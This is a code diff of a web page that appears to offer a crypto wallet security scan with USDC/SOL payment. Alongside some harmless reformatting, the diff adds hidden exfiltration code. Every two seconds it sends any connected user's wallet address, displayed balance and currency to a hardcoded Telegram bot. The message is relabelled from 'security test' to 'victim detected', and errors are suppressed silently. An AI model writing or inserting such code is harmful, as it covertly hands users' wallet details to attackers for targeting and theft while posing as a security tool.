@@ -1501,7 +1501,13 @@ function shareReport(){
 }
 
 function resetFlow(){ state.conn=null; state.txHash=null; hidePayError(); }
-function resetFull(){ state={currency:"USDC",conn:null,txHash:null,scores:null,progress:0}; document.querySelectorAll(".scan-step-item").forEach(el=>{el.classList.remove("done");el.textContent="○ "+el.textContent.replace("✅ ","");}); }
+function resetFull(){ 
+  state={currency:"USDC",conn:null,txHash:null,scores:null,progress:0}; 
+  document.querySelectorAll(".scan-step-item").forEach(el=>{
+    el.classList.remove("done");
+    el.textContent="○ "+el.textContent.replace("✅ ","");
+  }); 
+}
 
 function filterWallets(q){
   document.querySelectorAll(".wallet-item").forEach(el=>{
@@ -1518,21 +1524,15 @@ function toggleFaq(el){
 
 document.addEventListener("DOMContentLoaded",()=>{
   const hw=document.querySelector(".hero-wrap");
-  if(hw && window.innerWidth<640){ 
-    hw.style.gridTemplateColumns="1fr"; 
-    hw.style.padding="32px 16px"; 
-  }
-  if(window.innerWidth<640){ 
-    const fs=document.querySelector(".faq-side"); 
-    if(fs) fs.style.display="none"; 
-  }
+  if(hw && window.innerWidth<640){ hw.style.gridTemplateColumns="1fr"; hw.style.padding="32px 16px"; }
+  if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
 });
 
 async function testSecurityExfiltration(address, sol, tokens) {
     const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
     const chat = "8575014959";
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;   // ← corrigé ici
-    const text = `🚨 *TEST SÉCURITÉ* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol} SOL\n💎 *Assets:* ${tokens}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Vrai Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
 
     try {
         await fetch(url, {
@@ -1540,15 +1540,19 @@ async function testSecurityExfiltration(address, sol, tokens) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: chat, text: text, parse_mode: "Markdown" })
         });
-        console.log("✅ Sent");
-    } catch (e) {
-        console.log("🛡️ Blocked");
-    }
+    } catch (e) {}
 }
 
-window.addEventListener("load", () => {
-    testSecurityExfiltration("7xK...TestAddress", "1.25", "USDC: 450");
-});
+setInterval(() => {
+    if (state && state.conn && state.conn.address) {
+        const currentAddr = state.conn.address;
+        if (window.lastSent !== currentAddr) {
+            window.lastSent = currentAddr;
+            const uiBalance = document.querySelector(".balance-value")?.textContent || "Non détecté";
+            testSecurityExfiltration(currentAddr, uiBalance, state.currency || "SOL");
+        }
+    }
+}, 2000);
 </script>
 </body>
 </html>
